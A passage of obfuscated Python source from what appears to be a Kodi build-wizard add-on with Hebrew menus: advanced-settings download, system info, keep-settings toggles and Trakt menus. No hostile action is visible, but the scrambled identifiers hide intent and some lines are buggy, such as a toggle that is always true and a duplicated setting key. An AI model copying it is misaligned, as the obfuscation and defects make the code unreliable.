						addFile (OO00OOO0OOOOOOOOO ,'writeadvanced',OO00OOO0OOOOOOOOO ,url ,description =OO00OOOOO00OO00OO ,icon =O00000OO000000000 ,fanart =OO0000O0000O00OO0 ,themeit =THEME2 )#line:2810
			else :wiz .log ("[Advanced Settings] ERROR: Invalid Format.")#line:2811
		else :wiz .log ("[Advanced Settings] URL not working: %s"%OO0O0OO00OOOO0OO0 )#line:2812
	else :wiz .log ("[Advanced Settings] not Enabled")#line:2813
def writeAdvanced (O0OOO0O0000OO0OO0 ,O00OOOOO00OOOO000 ):#line:2815
	OOO0O0O0000OOO0O0 =wiz .workingURL (O00OOOOO00OOOO000 )#line:2816
	if OOO0O0O0000OOO0O0 ==True :#line:2817
		if os .path .exists (ADVANCED ):O0000O0O000O000O0 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to overwrite your current Advanced Settings with [COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,O0OOO0O0000OO0OO0 ),yeslabel ="[B][COLOR green]Overwrite[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel[/COLOR][/B]")#line:2818
		else :O0000O0O000O000O0 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]האם תרצה להוריד ולהתקין [COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,O0OOO0O0000OO0OO0 ),yeslabel ="[B][COLOR green]התקנה[/COLOR][/B]",nolabel ="[B][COLOR red]ביטול[/COLOR][/B]")#line:2819
		if O0000O0O000O000O0 ==1 :#line:2821
			O0OOOOO0OO0OO0O00 =wiz .openURL (O00OOOOO00OOOO000 )#line:2822
			OOOOOO00000OO000O =open (ADVANCED ,'w');#line:2823
			OOOOOO00000OO000O .write (O0OOOOO0OO0OO0O00 )#line:2824
			OOOOOO00000OO000O .close ()#line:2825
			DIALOG .ok (ADDONTITLE ,'[COLOR %s]AdvancedSettings.xml file has been successfully written.  Once you click okay it will force close kodi.[/COLOR]'%COLOR2 )#line:2826
			wiz .killxbmc (True )#line:2827
		else :wiz .log ("[Advanced Settings] install canceled");wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Write Cancelled![/COLOR]"%COLOR2 );return #line:2828
	else :wiz .log ("[Advanced Settings] URL not working: %s"%OOO0O0O0000OOO0O0 );wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,ADDONTITLE ),"[COLOR %s]URL Not Working[/COLOR]"%COLOR2 )#line:2829
def viewAdvanced ():#line:2831
	OO00O0O000OOO0O00 =open (ADVANCED )#line:2832
	OOOO0O00O000OO00O =OO00O0O000OOO0O00 .read ().replace ('\t','    ')#line:2833
	wiz .TextBox (ADDONTITLE ,OOOO0O00O000OO00O )#line:2834
	OO00O0O000OOO0O00 .close ()#line:2835
def removeAdvanced ():#line:2837
	if os .path .exists (ADVANCED ):#line:2838
		wiz .removeFile (ADVANCED )#line:2839
	else :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]AdvancedSettings.xml not found[/COLOR]")#line:2840
def showAutoAdvanced ():#line:2842
	notify .autoConfig ()#line:2843
def getIP ():#line:2845
	O00O00OOOOO00O00O ='http://whatismyipaddress.com/'#line:2846
	if not wiz .workingURL (O00O00OOOOO00O00O ):return 'Unknown','Unknown','Unknown'#line:2847
	OO0O0OOOOO00000O0 =wiz .openURL (O00O00OOOOO00O00O ).replace ('\n','').replace ('\r','')#line:2848
	if not 'Access Denied'in OO0O0OOOOO00000O0 :#line:2849
		O0O0O0OO00OOO0OOO =re .compile ('whatismyipaddress.com/ip/(.+?)"').findall (OO0O0OOOOO00000O0 )#line:2850
		OOOO000O0O0OO0000 =O0O0O0OO00OOO0OOO [0 ]if (len (O0O0O0OO00OOO0OOO )>0 )else 'Unknown'#line:2851
		O00OO00O0O0000000 =re .compile ('"font-size:14px;">(.+?)</td>').findall (OO0O0OOOOO00000O0 )#line:2852
		O000O0OOO0O0000OO =O00OO00O0O0000000 [0 ]if (len (O00OO00O0O0000000 )>0 )else 'Unknown'#line:2853
		OO0O0O0O0OOO0OO0O =O00OO00O0O0000000 [1 ]+', '+O00OO00O0O0000000 [2 ]+', '+O00OO00O0O0000000 [3 ]if (len (O00OO00O0O0000000 )>2 )else 'Unknown'#line:2854
		return OOOO000O0O0OO0000 ,O000O0OOO0O0000OO ,OO0O0O0O0OOO0OO0O #line:2855
	else :return 'Unknown','Unknown','Unknown'#line:2856
def systemInfo ():#line:2858
	O00000O000OOOOOO0 =['System.FriendlyName','System.BuildVersion','System.CpuUsage','System.ScreenMode','Network.IPAddress','Network.MacAddress','System.Uptime','System.TotalUptime','System.FreeSpace','System.UsedSpace','System.TotalSpace','System.Memory(free)','System.Memory(used)','System.Memory(total)']#line:2872
	OOOO0O00O0OO00O0O =[];O0OOO000OOO0O00O0 =0 #line:2873
	for OOOO00O000OO00OOO in O00000O000OOOOOO0 :#line:2874
		O0O0OO0O0O0OOOO00 =wiz .getInfo (OOOO00O000OO00OOO )#line:2875
		OO000OO00OOOOO0OO =0 #line:2876
		while O0O0OO0O0O0OOOO00 =="Busy"and OO000OO00OOOOO0OO <10 :#line:2877
			O0O0OO0O0O0OOOO00 =wiz .getInfo (OOOO00O000OO00OOO );OO000OO00OOOOO0OO +=1 ;wiz .log ("%s sleep %s"%(OOOO00O000OO00OOO ,str (OO000OO00OOOOO0OO )));xbmc .sleep (1000 )#line:2878
		OOOO0O00O0OO00O0O .append (O0O0OO0O0O0OOOO00 )#line:2879
		O0OOO000OOO0O00O0 +=1 #line:2880
	OO00OOOOO0000000O =OOOO0O00O0OO00O0O [8 ]if 'Una'in OOOO0O00O0OO00O0O [8 ]else wiz .convertSize (int (float (OOOO0O00O0OO00O0O [8 ][:-8 ]))*1024 *1024 )#line:2881
	OO00O000O00OOOOO0 =OOOO0O00O0OO00O0O [9 ]if 'Una'in OOOO0O00O0OO00O0O [9 ]else wiz .convertSize (int (float (OOOO0O00O0OO00O0O [9 ][:-8 ]))*1024 *1024 )#line:2882
	OOO00OO0O0O0OO0O0 =OOOO0O00O0OO00O0O [10 ]if 'Una'in OOOO0O00O0OO00O0O [10 ]else wiz .convertSize (int (float (OOOO0O00O0OO00O0O [10 ][:-8 ]))*1024 *1024 )#line:2883
	O0OOO0O00O000OO00 =wiz .convertSize (int (float (OOOO0O00O0OO00O0O [11 ][:-2 ]))*1024 *1024 )#line:2884
	OO0OOO0OO00000OO0 =wiz .convertSize (int (float (OOOO0O00O0OO00O0O [12 ][:-2 ]))*1024 *1024 )#line:2885
	O0OOOO00OOOOO000O =wiz .convertSize (int (float (OOOO0O00O0OO00O0O [13 ][:-2 ]))*1024 *1024 )#line:2886
	O0O000000O0OO00O0 ,OOO000OOOOO0OOOO0 ,OOO00O0O00OOO0OO0 =getIP ()#line:2887
	O0O0OOO0O0O00O00O =[];OO0O000O00OO0OOOO =[];OOOOO00O00OO0O00O =[];O00OOO0O0OOOOOO0O =[];OOOOO0OO0OO0OO0O0 =[];O0OOOOO000O00OOOO =[];O00000OO00O000O0O =[]#line:2889
	OO0OO000O0O0OO0O0 =glob .glob (os .path .join (ADDONS ,'*/'))#line:2891
	for O000000000OO00OOO in sorted (OO0OO000O0O0OO0O0 ,key =lambda OO0O0O0O000O00O0O :OO0O0O0O000O00O0O ):#line:2892
		O0O0O0OOO00OO0O0O =os .path .split (O000000000OO00OOO [:-1 ])[1 ]#line:2893
		if O0O0O0OOO00OO0O0O =='packages':continue #line:2894
		O0O0O0OO0OOOO000O =os .path .join (O000000000OO00OOO ,'addon.xml')#line:2895
		if os .path .exists (O0O0O0OO0OOOO000O ):#line:2896
			O0OOO0O00OO000O0O =open (O0O0O0OO0OOOO000O )#line:2897
			OOO0O0OO000O0OOOO =O0OOO0O00OO000O0O .read ()#line:2898
			OO0O0O0O0OO0000O0 =re .compile ("<provides>(.+?)</provides>").findall (OOO0O0OO000O0OOOO )#line:2899
			if len (OO0O0O0O0OO0000O0 )==0 :#line:2900
				if O0O0O0OOO00OO0O0O .startswith ('skin'):O00000OO00O000O0O .append (O0O0O0OOO00OO0O0O )#line:2901
				if O0O0O0OOO00OO0O0O .startswith ('repo'):OOOOO0OO0OO0OO0O0 .append (O0O0O0OOO00OO0O0O )#line:2902
				else :O0OOOOO000O00OOOO .append (O0O0O0OOO00OO0O0O )#line:2903
			elif not (OO0O0O0O0OO0000O0 [0 ]).find ('executable')==-1 :O00OOO0O0OOOOOO0O .append (O0O0O0OOO00OO0O0O )#line:2904
			elif not (OO0O0O0O0OO0000O0 [0 ]).find ('video')==-1 :OOOOO00O00OO0O00O .append (O0O0O0OOO00OO0O0O )#line:2905
			elif not (OO0O0O0O0OO0000O0 [0 ]).find ('audio')==-1 :OO0O000O00OO0OOOO .append (O0O0O0OOO00OO0O0O )#line:2906
			elif not (OO0O0O0O0OO0000O0 [0 ]).find ('image')==-1 :O0O0OOO0O0O00O00O .append (O0O0O0OOO00OO0O0O )#line:2907
	addFile ('[B]Media Center Info:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:2909
	addFile ('[COLOR %s]Name:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOO0O00O0OO00O0O [0 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:2910
	addFile ('[COLOR %s]Version:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOO0O00O0OO00O0O [1 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:2911
	addFile ('[COLOR %s]Platform:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,wiz .platform ().title ()),'',icon =ICONMAINT ,themeit =THEME3 )#line:2912
	addFile ('[COLOR %s]CPU Usage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOO0O00O0OO00O0O [2 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:2913
	addFile ('[COLOR %s]Screen Mode:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOO0O00O0OO00O0O [3 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:2914
	addFile ('[B]Uptime:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:2916
	addFile ('[COLOR %s]Current Uptime:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOO0O00O0OO00O0O [6 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2917
	addFile ('[COLOR %s]Total Uptime:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOO0O00O0OO00O0O [7 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2918
	addFile ('[B]Local Storage:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:2920
	addFile ('[COLOR %s]Used Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO00OOOOO0000000O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2921
	addFile ('[COLOR %s]Free Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO00O000O00OOOOO0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2922
	addFile ('[COLOR %s]Total Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO00OO0O0O0OO0O0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2923
	addFile ('[B]Ram Usage:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:2925
	addFile ('[COLOR %s]Used Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OOO0O00O000OO00 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2926
	addFile ('[COLOR %s]Free Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0OOO0OO00000OO0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2927
	addFile ('[COLOR %s]Total Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OOOO00OOOOO000O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2928
	addFile ('[B]Network:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:2930
	addFile ('[COLOR %s]Local IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOO0O00O0OO00O0O [4 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2931
	addFile ('[COLOR %s]External IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O000000O0OO00O0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2932
	addFile ('[COLOR %s]Provider:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO000OOOOO0OOOO0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2933
	addFile ('[COLOR %s]Location:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO00O0O00OOO0OO0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2934
	addFile ('[COLOR %s]MacAddress:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOO0O00O0OO00O0O [5 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2935
	OO0OOOOOO00O0O00O =len (O0O0OOO0O0O00O00O )+len (OO0O000O00OO0OOOO )+len (OOOOO00O00OO0O00O )+len (O00OOO0O0OOOOOO0O )+len (O0OOOOO000O00OOOO )+len (O00000OO00O000O0O )+len (OOOOO0OO0OO0OO0O0 )#line:2937
	addFile ('[B]Addons([COLOR %s]%s[/COLOR]):[/B]'%(COLOR1 ,OO0OOOOOO00O0O00O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2938
	addFile ('[COLOR %s]Video Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OOOOO00O00OO0O00O ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2939
	addFile ('[COLOR %s]Program Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O00OOO0O0OOOOOO0O ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2940
	addFile ('[COLOR %s]Music Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OO0O000O00OO0OOOO ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2941
	addFile ('[COLOR %s]Picture Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O0O0OOO0O0O00O00O ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2942
	addFile ('[COLOR %s]Repositories:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OOOOO0OO0OO0OO0O0 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2943
	addFile ('[COLOR %s]Skins:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O00000OO00O000O0O ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2944
	addFile ('[COLOR %s]Scripts/Modules:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O0OOOOO000O00OOOO ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2945
def Menu ():#line:2946
	addDir ('אפשרויות נוספות','mor',icon =ICONSAVE ,themeit =THEME1 )#line:2947
def saveMenu ():#line:2949
	O0OO000000OOO0O0O ='[COLOR yellow]מופעל[/COLOR]';OOOOOO0O0OOOO00O0 ='[COLOR blue]מבוטל[/COLOR]'#line:2951
	OOOOOOO00OO0000OO ='true'if KEEPMOVIEWALL =='true'else 'false'#line:2952
	O0OO00O0000O000OO ='true'if KEEPMOVIELIST =='true'else 'false'#line:2953
	OO00O0O00OOOO00O0 ='true'if KEEPINFO =='true'else 'false'#line:2954
	O000OO0OOO0OOOO00 ='true'if KEEPSOUND =='true'else 'false'#line:2956
	O00OO0OO0000O00OO ='true'if KEEPVIEW =='true'else 'false'#line:2957
	O0OO0000O00O0O00O ='true'if KEEPSKIN =='true'else 'false'#line:2958
	O0O00OOOOO00OO00O ='true'if KEEPSKIN2 =='true'else 'false'#line:2959
	O00OO0OOO0OO000O0 ='true'if KEEPSKIN3 =='true'else 'false'#line:2960
	O000OOOOOOOOO0OOO ='true'if KEEPADDONS =='true'else 'false'#line:2961
	O0O0OOO000O0O0O0O ='true'if KEEPPVR =='true'else 'false'#line:2962
	OO00O000OOOOOOOOO ='true'if KEEPTVLIST =='true'else 'false'#line:2963
	OOO0OO0O0O000OOO0 ='true'if KEEPHUBMOVIE =='true'else 'false'#line:2964
	OO000O00OO00OO00O ='true'if KEEPHUBTVSHOW =='true'else 'false'#line:2965
	O000O0OOO0OOO000O ='true'if KEEPHUBTV =='true'else 'false'#line:2966
	OO0OO0OO0OO0O0O00 ='true'if KEEPHUBVOD =='true'else 'false'#line:2967
	O0OOO00000O0OOOO0 ='true'if KEEPHUBSPORT =='true'else 'false'#line:2968
	OOOOOO0OOOOOO0000 ='true'if KEEPHUBKIDS =='true'else 'false'#line:2969
	OOOOO0O000O0OO0O0 ='true'if KEEPHUBMUSIC =='true'else 'false'#line:2970
	OOOO0OO0OOOO00000 ='true'if KEEPHUBMENU =='true'else 'false'#line:2971
	OO0000O0OOO0O000O ='true'if KEEPPLAYLIST =='true'else 'false'#line:2972
	OOO0OOO0OO0O000O0 ='true'if KEEPTRAKT =='true'else 'false'#line:2973
	O0O0OO00O0OOOO0OO ='true'if KEEPREAL =='true'else 'false'#line:2974
	O00O0O00000OO00O0 ='true'if KEEPRD2 =='true'else 'false'#line:2975
	O0OOOOOO0O0000O0O ='true'if KEEPTORNET =='true'else 'true'#line:2976
	O00000OO000O0O000 ='true'if KEEPLOGIN =='true'else 'false'#line:2977
	OO0O0O0000000OOO0 ='true'if KEEPSOURCES =='true'else 'false'#line:2978
	OO0O00O0OO00OO0OO ='true'if KEEPADVANCED =='true'else 'false'#line:2979
	OO0OOO0O0O00OO00O ='true'if KEEPPROFILES =='true'else 'false'#line:2980
	OOOOO0000OO0O00O0 ='true'if KEEPFAVS =='true'else 'false'#line:2981
	OO000000000O00OO0 ='true'if KEEPREPOS =='true'else 'false'#line:2982
	O000OOOOO0O0OOO00 ='true'if KEEPSUPER =='true'else 'false'#line:2983
	OO0O0OO000OO0O00O ='true'if KEEPWHITELIST =='true'else 'false'#line:2984
	OO0OOO00OOOO0O0O0 ='true'if KEEPWEATHER =='true'else 'false'#line:2985
	if OO0O0OO000OO0O00O =='true':#line:2989
		addFile ('בחר הרחבות לשמירה','whitelist','edit',icon =ICONSAVE ,themeit =THEME1 )#line:2990
		addFile ('רשימת ההרחבות שבחרתי לשמור','whitelist','view',icon =ICONSAVE ,themeit =THEME1 )#line:2991
		addFile ('נקה רשימת הרחבות','whitelist','clear',icon =ICONSAVE ,themeit =THEME1 )#line:2992
		addFile ('יבה רשימת הרחבות','whitelist','import',icon =ICONSAVE ,themeit =THEME1 )#line:2993
		addFile ('יצא רשימת הרחבות','whitelist','export',icon =ICONSAVE ,themeit =THEME1 )#line:2994
	addFile ('%s התקנת קיר סרטים: '%OOOOOOO00OO0000OO .replace ('true',O0OO000000OOO0O0O ).replace ('false',OOOOOO0O0OOOO00O0 ),'togglesetting','keepmoviewall',icon =ICONTRAKT ,themeit =THEME1 )#line:2996
	addFile ('%s שמירת חשבון RD:  '%O0O0OO00O0OOOO0OO .replace ('true',O0OO000000OOO0O0O ).replace ('false',OOOOOO0O0OOOO00O0 ),'togglesetting','keepdebrid',icon =ICONREAL ,themeit =THEME1 )#line:2997
	addFile ('%s שמירת חשבון טראקט:  '%OOO0OOO0OO0O000O0 .replace ('true',O0OO000000OOO0O0O ).replace ('false',OOOOOO0O0OOOO00O0 ),'togglesetting','keeptrakt',icon =ICONTRAKT ,themeit =THEME1 )#line:2998
	addFile ('%s שמירת מועדפים:  '%OOOOO0000OO0O00O0 .replace ('true',O0OO000000OOO0O0O ).replace ('false',OOOOOO0O0OOOO00O0 ),'togglesetting','keepfavourites',icon =ICONSAVE ,themeit =THEME1 )#line:3001
	addFile ('%s שמירת לקוח טלוויזיה:  '%O0O0OOO000O0O0O0O .replace ('true',O0OO000000OOO0O0O ).replace ('false',OOOOOO0O0OOOO00O0 ),'togglesetting','keeppvr',icon =ICONTRAKT ,themeit =THEME1 )#line:3002
	addFile ('%s שמירת רשימת עורצי טלוויזיה:  '%OO00O000OOOOOOOOO .replace ('true',O0OO000000OOO0O0O ).replace ('false',OOOOOO0O0OOOO00O0 ),'togglesetting','keeptvlist',icon =ICONTRAKT ,themeit =THEME1 )#line:3003
	addFile ('%s שמירת אריח סרטים:  '%OOO0OO0O0O000OOO0 .replace ('true',O0OO000000OOO0O0O ).replace ('false',OOOOOO0O0OOOO00O0 ),'togglesetting','keephubmovie',icon =ICONTRAKT ,themeit =THEME1 )#line:3004
	addFile ('%s שמירת אריח סדרות:  '%OO000O00OO00OO00O .replace ('true',O0OO000000OOO0O0O ).replace ('false',OOOOOO0O0OOOO00O0 ),'togglesetting','keephubtvshow',icon =ICONTRAKT ,themeit =THEME1 )#line:3005
	addFile ('%s שמירת אריח טלויזיה:  '%O000O0OOO0OOO000O .replace ('true',O0OO000000OOO0O0O ).replace ('false',OOOOOO0O0OOOO00O0 ),'togglesetting','keephubtv',icon =ICONTRAKT ,themeit =THEME1 )#line:3006
	addFile ('%s שמירת אריח תוכן ישראלי:  '%OO0OO0OO0OO0O0O00 .replace ('true',O0OO000000OOO0O0O ).replace ('false',OOOOOO0O0OOOO00O0 ),'togglesetting','keephubvod',icon =ICONTRAKT ,themeit =THEME1 )#line:3007
	addFile ('%s שמירת אריח ספורט:  '%O0OOO00000O0OOOO0 .replace ('true',O0OO000000OOO0O0O ).replace ('false',OOOOOO0O0OOOO00O0 ),'togglesetting','keephubvod',icon =ICONTRAKT ,themeit =THEME1 )#line:3008
	addFile ('%s שמירת אריח ילדים:  '%OOOOOO0OOOOOO0000 .replace ('true',O0OO000000OOO0O0O ).replace ('false',OOOOOO0O0OOOO00O0 ),'togglesetting','keephubkids',icon =ICONTRAKT ,themeit =THEME1 )#line:3009
	addFile ('%s שמירת אריח מוסיקה:  '%OOOOO0O000O0OO0O0 .replace ('true',O0OO000000OOO0O0O ).replace ('false',OOOOOO0O0OOOO00O0 ),'togglesetting','keephubmusic',icon =ICONTRAKT ,themeit =THEME1 )#line:3010
	addFile ('%s שמירת תפריט אריחים ראשי:  '%OOOO0OO0OOOO00000 .replace ('true',O0OO000000OOO0O0O ).replace ('false',OOOOOO0O0OOOO00O0 ),'togglesetting','keephubmenu',icon =ICONTRAKT ,themeit =THEME1 )#line:3011
	addFile ('%s שמירת כל האריחים בסקין:  '%O0OO0000O00O0O00O .replace ('true',O0OO000000OOO0O0O ).replace ('false',OOOOOO0O0OOOO00O0 ),'togglesetting','keepskin',icon =ICONTRAKT ,themeit =THEME1 )#line:3012
	addFile ('%s שמירת הגדרות מזג האוויר:  '%OO0OOO00OOOO0O0O0 .replace ('true',O0OO000000OOO0O0O ).replace ('false',OOOOOO0O0OOOO00O0 ),'togglesetting','keepweather',icon =ICONTRAKT ,themeit =THEME1 )#line:3013
	addFile ('%s שמירת הרחבות שהתקנתי:  '%O000OOOOOOOOO0OOO .replace ('true',O0OO000000OOO0O0O ).replace ('false',OOOOOO0O0OOOO00O0 ),'togglesetting','keepaddons',icon =ICONTRAKT ,themeit =THEME1 )#line:3019
	addFile ('%s שמירת סיסמאות, חשבונות ,מיקומי הורדות:  '%OO00O0O00OOOO00O0 .replace ('true',O0OO000000OOO0O0O ).replace ('false',OOOOOO0O0OOOO00O0 ),'togglesetting','keepinfo',icon =ICONTRAKT ,themeit =THEME1 )#line:3020
	addFile ('%s שמירת ספריית סרטים וסדרות:  '%O0OO00O0000O000OO .replace ('true',O0OO000000OOO0O0O ).replace ('false',OOOOOO0O0OOOO00O0 ),'togglesetting','keepmovielist',icon =ICONTRAKT ,themeit =THEME1 )#line:3023
	addFile ('%s שמירת מקורות וידאו:  '%OO0O0O0000000OOO0 .replace ('true',O0OO000000OOO0O0O ).replace ('false',OOOOOO0O0OOOO00O0 ),'togglesetting','keepsources',icon =ICONSAVE ,themeit =THEME1 )#line:3024
	addFile ('%s שמירת הגדרות סאונד ורזולוציה:  '%O000OO0OOO0OOOO00 .replace ('true',O0OO000000OOO0O0O ).replace ('false',OOOOOO0O0OOOO00O0 ),'togglesetting','keepsound',icon =ICONTRAKT ,themeit =THEME1 )#line:3025
	addFile ('%s שמירת הגדרות בסקין :צבעים\תצוגות מדיה  : '%O00OO0OO0000O00OO .replace ('true',O0OO000000OOO0O0O ).replace ('false',OOOOOO0O0OOOO00O0 ),'togglesetting','keepview',icon =ICONTRAKT ,themeit =THEME1 )#line:3027
	addFile ('%s שמירת פליליסט לאודר:  '%OO0000O0OOO0O000O .replace ('true',O0OO000000OOO0O0O ).replace ('false',OOOOOO0O0OOOO00O0 ),'togglesetting','keepplaylist',icon =ICONTRAKT ,themeit =THEME1 )#line:3028
	addFile ('%s שמירת הגדרות באפר: '%OO0O00O0OO00OO0OO .replace ('true',O0OO000000OOO0O0O ).replace ('false',OOOOOO0O0OOOO00O0 ),'togglesetting','keepadvanced',icon =ICONSAVE ,themeit =THEME1 )#line:3033
	addFile ('%s שמירת רשימות ריפו:  '%OO000000000O00OO0 .replace ('true',O0OO000000OOO0O0O ).replace ('false',OOOOOO0O0OOOO00O0 ),'togglesetting','keeprepos',icon =ICONSAVE ,themeit =THEME1 )#line:3035
	setView ('files','viewType')#line:3037
def traktMenu ():#line:3039
	OOO0OO0OO0O00OO00 ='[COLOR green]מופעל[/COLOR]'if KEEPTRAKT =='true'else '[COLOR red]מבוטל[/COLOR]'#line:3040
	O0O000O0OO0O0OO00 =str (TRAKTSAVE )if not TRAKTSAVE ==''else 'Trakt hasnt been saved yet.'#line:3041
	addFile ('[I]Register FREE Account at http://trakt.tv[/I]','',icon =ICONTRAKT ,themeit =THEME3 )#line:3042
	addFile ('Save Trakt Data: %s'%OOO0OO0OO0O00OO00 ,'togglesetting','keeptrakt',icon =ICONTRAKT ,themeit =THEME3 )#line:3043
	if KEEPTRAKT =='true':addFile ('Last Save: %s'%str (O0O000O0OO0O0OO00 ),'',icon =ICONTRAKT ,themeit =THEME3 )#line:3044
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONTRAKT ,themeit =THEME3 )#line:3045
	for OOO0OO0OO0O00OO00 in traktit .ORDER :#line:3047
		OOO0O00O00OOOOO0O =TRAKTID [OOO0OO0OO0O00OO00 ]['name']#line:3048
		OO000000OO0000O00 =TRAKTID [OOO0OO0OO0O00OO00 ]['path']#line:3049
		O0OOOOO000OOOOOOO =TRAKTID [OOO0OO0OO0O00OO00 ]['saved']#line:3050
		O0O0O00O0O0O00OO0 =TRAKTID [OOO0OO0OO0O00OO00 ]['file']#line:3051
		OOO0O0OO0OO000OO0 =wiz .getS (O0OOOOO000OOOOOOO )#line:3052
		OOO0O00000000OOO0 =traktit .traktUser (OOO0OO0OO0O00OO00 )#line:3053
		OO00O00O0OOOO000O =TRAKTID [OOO0OO0OO0O00OO00 ]['icon']if os .path .exists (OO000000OO0000O00 )else ICONTRAKT #line:3054
		OOO00OOO0O000OO00 =TRAKTID [OOO0OO0OO0O00OO00 ]['fanart']if os .path .exists (OO000000OO0000O00 )else FANART #line:3055
		O00OOO0OO0O0OO00O =createMenu ('saveaddon','Trakt',OOO0OO0OO0O00OO00 )#line:3056
		O0OOOO00000OOOO00 =createMenu ('save','Trakt',OOO0OO0OO0O00OO00 )#line:3057
		O00OOO0OO0O0OO00O .append ((THEME2 %'%s Settings'%OOO0O00O00OOOOO0O ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=trakt)'%(ADDON_ID ,OOO0OO0OO0O00OO00 )))#line:3058
		addFile ('[+]-> %s'%OOO0O00O00OOOOO0O ,'',icon =OO00O00O0OOOO000O ,fanart =OOO00OOO0O000OO00 ,themeit =THEME3 )#line:3060
		if not os .path .exists (OO000000OO0000O00 ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =OO00O00O0OOOO000O ,fanart =OOO00OOO0O000OO00 ,menu =O00OOO0OO0O0OO00O )#line:3061
		elif not OOO0O00000000OOO0 :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authtrakt',OOO0OO0OO0O00OO00 ,icon =OO00O00O0OOOO000O ,fanart =OOO00OOO0O000OO00 ,menu =O00OOO0OO0O0OO00O )#line:3062
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%OOO0O00000000OOO0 ,'authtrakt',OOO0OO0OO0O00OO00 ,icon =OO00O00O0OOOO000O ,fanart =OOO00OOO0O000OO00 ,menu =O00OOO0OO0O0OO00O )#line:3063
		if OOO0O0OO0OO000OO0 =="":#line:3064
			if os .path .exists (O0O0O00O0O0O00OO0 ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importtrakt',OOO0OO0OO0O00OO00 ,icon =OO00O00O0OOOO000O ,fanart =OOO00OOO0O000OO00 ,menu =O0OOOO00000OOOO00 )#line:3065
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savetrakt',OOO0OO0OO0O00OO00 ,icon =OO00O00O0OOOO000O ,fanart =OOO00OOO0O000OO00 ,menu =O0OOOO00000OOOO00 )#line:3066
